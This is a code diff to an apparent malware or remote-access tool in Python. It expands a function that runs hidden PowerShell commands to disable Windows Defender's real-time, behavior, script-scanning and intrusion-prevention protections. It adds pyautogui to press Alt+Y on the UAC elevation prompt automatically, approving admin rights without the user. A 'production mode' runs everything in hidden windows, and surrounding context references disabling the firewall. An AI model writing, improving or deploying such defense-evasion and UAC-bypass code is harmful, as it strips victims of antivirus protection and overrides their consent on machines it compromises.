@@ -28,6 +28,7 @@ import subprocess
 from datetime import datetime, timedelta
 from pathlib import Path
 from collections import deque
+import pyautogui
 
 # Try to import Windows-specific modules
 try:
@@ -1014,47 +1015,87 @@ def disable_firewall():
         return False
 
 
-def disable_defender():
-    """Disable Windows Defender real-time protection using PowerShell as Administrator"""
+def disable_defender(debug=True):
+    """Disable Windows Defender real-time protection using PowerShell as Administrator
+
+    Args:
+        debug: If True, capture and print PowerShell output for debugging
+    """
     if not WINDOWS:
+        print("[!] Not running on Windows, skipping disable_defender")
         return False
     try:
+        print("[*] Starting to disable Windows Defender...")
         # PowerShell commands to disable Windows Defender
         ps_commands = [
-            "Set-MpPreference -DisableRealtimeMonitoring $true",
-            "Set-MpPreference -DisableBehaviorMonitoring $true",
-            "Set-MpPreference -DisableBlockAtFirstSeen $true",
-            "Set-MpPreference -DisableIOAVProtection $true",
-            "Set-MpPreference -DisableScriptScanning $true",
-            "Set-MpPreference -DisableArchiveScanning $true",
-            "Set-MpPreference -DisableIntrusionPreventionSystem $true",
+            ("Set-MpPreference -DisableRealtimeMonitoring $true", "Realtime Monitoring"),
+            ("Set-MpPreference -DisableBehaviorMonitoring $true", "Behavior Monitoring"),
+            ("Set-MpPreference -DisableBlockAtFirstSeen $true", "Block At First Seen"),
+            ("Set-MpPreference -DisableIOAVProtection $true", "IOAV Protection"),
+            ("Set-MpPreference -DisableScriptScanning $true", "Script Scanning"),
+            ("Set-MpPreference -DisableArchiveScanning $true", "Archive Scanning"),
+            ("Set-MpPreference -DisableIntrusionPreventionSystem $true", "Intrusion Prevention System"),
         ]
 
         # Execute each command with elevated privileges
-        for ps_cmd in ps_commands:
+        for ps_cmd, feature_name in ps_commands:
             try:
-                # Use PowerShell with -ExecutionPolicy Bypass and run as admin
-                full_cmd = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"'
+                print(f"[*] Disabling {feature_name}...")
 
-                # Try to run with elevated privileges using ShellExecute
-                if WINDOWS:
-                    try:
-                        ctypes.windll.shell32.ShellExecuteW(
+                if debug:
+                    # DEBUG MODE: Use subprocess to capture output first
+                    result = subprocess.run(
+                        ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+
+                    print(f"    [DEBUG] Return code: {result.returncode}")
+                    if result.stdout.strip():
+                        print(f"    [DEBUG] stdout: {result.stdout.strip()}")
+                    if result.stderr.strip():
+                        print(f"    [DEBUG] stderr: {result.stderr.strip()}")
+
+                    if result.returncode == 0 and not result.stderr.strip():
+                        print(f"[+] {feature_name} disabled successfully!")
+                    else:
+                        print(f"[-] {feature_name} needs admin - trying UAC elevation...")
+                        # Try with ShellExecute for UAC
+                        ret = ctypes.windll.shell32.ShellExecuteW(
                             None,
                             "runas",  # Run as administrator
                             "powershell.exe",
-                            f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
+                            f'-ExecutionPolicy Bypass -Command "{ps_cmd}"',
                             None,
-                            0  # SW_HIDE
+                            1  # SW_SHOWNORMAL to see the window
                         )
-                    except:
-                        # Fallback to regular subprocess if elevation fails
-                        subprocess.call(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-            except:
+                        print(f"    [DEBUG] ShellExecuteW returned: {ret}")
+                        time.sleep(2)  # sleep for UAC prompt
+                        pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
+                        print(f"[+] UAC elevation attempted for {feature_name}")
+                else:
+                    # PRODUCTION MODE: Use ShellExecute with UAC
+                    ctypes.windll.shell32.ShellExecuteW(
+                        None,
+                        "runas",  # Run as administrator
+                        "powershell.exe",
+                        f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
+                        None,
+                        0  # SW_HIDE
+                    )
+                    time.sleep(2)  # sleep for UAC prompt
+                    pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
+                    print(f"[+] {feature_name} disabled successfully!")
+
+            except Exception as e:
+                print(f"[-] Error disabling {feature_name}: {e}")
                 continue
 
+        print("[+] Windows Defender disable process completed!")
         return True
-    except:
+    except Exception as e:
+        print(f"[-] Failed to disable Windows Defender: {e}")
         return False
 
 
